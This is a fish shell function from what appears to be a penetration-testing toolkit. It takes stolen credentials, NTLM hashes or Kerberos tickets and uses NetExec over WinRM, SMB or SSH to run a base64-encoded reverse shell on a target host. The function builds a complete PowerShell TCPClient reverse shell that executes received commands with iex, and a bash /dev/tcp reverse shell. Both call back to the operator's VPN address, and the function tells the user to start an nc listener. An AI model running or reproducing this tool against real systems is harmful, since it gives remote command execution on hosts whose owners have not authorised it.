function _ezpz_getshell
    source $EZPZ_HOME/functions/_ezpz_colors.fish
    
    set -l options 't/target=' 'u/username=' 'p/password=' 'H/hash=' 'd/domain=' 'k/kerberos' 'x/protocol=' 'port=' 'h/help'
    
    if not argparse $options -- $argv
        return 1
    end
    
    if set -q _flag_help
        echo "getshell - Get reverse shell from compromised hosts"
        echo
        echo "Usage: ezpz getshell -t <target> [options]"
        echo
        echo "Options:"
        echo "  -t, --target <ip>         Target host (Required)"
        echo "  -u, --username <user>     Username for authentication"
        echo "  -p, --password <pass>     Password for authentication"
        echo "  -H, --hash <hash>         NTLM hash for pass-the-hash"
        echo "  -d, --domain <domain>     Domain for authentication"
        echo "  -k, --kerberos            Use Kerberos authentication"
        echo "  -x, --protocol <proto>    Protocol to use (smb/winrm/ssh, default: winrm)"
        echo "  --port <port>             Reverse shell port (default: 9001)"
        echo "  -h, --help                Show this help message"
        echo
        echo "Examples:"
        echo "  ezpz getshell -t 192.168.1.10 -u administrator -H hash"
        echo "  ezpz getshell -t 192.168.1.20 -u root -p password -x ssh --port 4444"
        echo "  ezpz getshell -t 192.168.1.30 -u domain\\user -p pass -x smb -d domain.local"
        return 1
    end
    
    if not set -q _flag_target
        ezpz_error "Target IP required (-t)"
        echo
        echo "Usage: ezpz getshell -t <target> [options]"
        echo
        echo "Options:"
        echo "  -t, --target <ip>         Target host (Required)"
        echo "  -u, --username <user>     Username for authentication"
        echo "  -p, --password <pass>     Password for authentication"
        echo "  -H, --hash <hash>         NTLM hash for pass-the-hash"
        echo "  -d, --domain <domain>     Domain for authentication"
        echo "  -k, --kerberos            Use Kerberos authentication"
        echo "  -x, --protocol <proto>    Protocol to use (smb/winrm/ssh, default: winrm)"
        echo "  --port <port>             Reverse shell port (default: 9001)"
        echo "  -h, --help                Show this help message"
        echo
        echo "Examples:"
        echo "  ezpz getshell -t 192.168.1.10 -u administrator -H hash"
        echo "  ezpz getshell -t 192.168.1.20 -u root -p password -x ssh --port 4444"
        echo "  ezpz getshell -t 192.168.1.30 -u domain\\user -p pass -x smb -d domain.local"
        return 1
    end
    
    set -l target $_flag_target
    set -l protocol winrm
    set -l port 9001
    
    if set -q _flag_protocol
        set protocol $_flag_protocol
    end
    
    if set -q _flag_port
        set port $_flag_port
    end
    
    if not contains $protocol smb winrm ssh
        ezpz_error "Invalid protocol: $protocol. Use smb, winrm, or ssh"
        return 1
    end
    
    set -l auth_args
    
    if set -q _flag_username
        set -a auth_args -u $_flag_username
    else
        ezpz_error "Username required (-u)"
        return 1
    end
    
    if set -q _flag_password
        set -a auth_args -p $_flag_password
    else if set -q _flag_hash
        set -a auth_args -H $_flag_hash
    else if set -q _flag_kerberos
        set -a auth_args -k
    else
        ezpz_error "Authentication method required (-p, -H, or -k)"
        return 1
    end

    if set -q _flag_kerberos
        set -a auth_args -k
    end
    
    if set -q _flag_domain
        set -a auth_args -d $_flag_domain
    end
    
    # Get tun0 IP address
    set -l local_ip (ip addr show tun0 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1)
    
    if test -z "$local_ip"
        ezpz_error "Could not determine local IP address. Make sure tun0 is up or you're connected to VPN"
        return 1
    end
    
    ezpz_header "Getting reverse shell from $_flag_username@$target to $local_ip:$port using $protocol."
    
    set -l command
    switch $protocol
        case winrm smb
            # PowerShell reverse shell - need UTF-16LE encoding for -e flag
            set -l ps_payload "\$client = New-Object System.Net.Sockets.TCPClient('$local_ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
            set -l b64_payload (echo -n $ps_payload | iconv -t UTF-16LE | base64 -w 0)
            set command "powershell -e $b64_payload"
        case ssh
            # Bash reverse shell base64 encoded  
            set -l bash_payload "bash -c 'exec bash >& /dev/tcp/$local_ip/$port 0>&1 &'"
            set -l b64_payload (echo -n $bash_payload | base64 -w 0)
            set command "echo $b64_payload | base64 -d | bash"
    end
    
    ezpz_info "Make sure you have a listener running: nc -lvnp $port"
    
    if not command -v nxc >/dev/null 2>&1
        ezpz_error "NetExec (nxc) not found in PATH"
        return 1
    end
    
    ezpz_cmd "nxc $protocol $target $auth_args -x <b64 encoded revshell>"
    nxc $protocol $target $auth_args -X $command 2>/dev/null | tail -n +3 | tr -s " " | cut -d ' ' -f 6-
end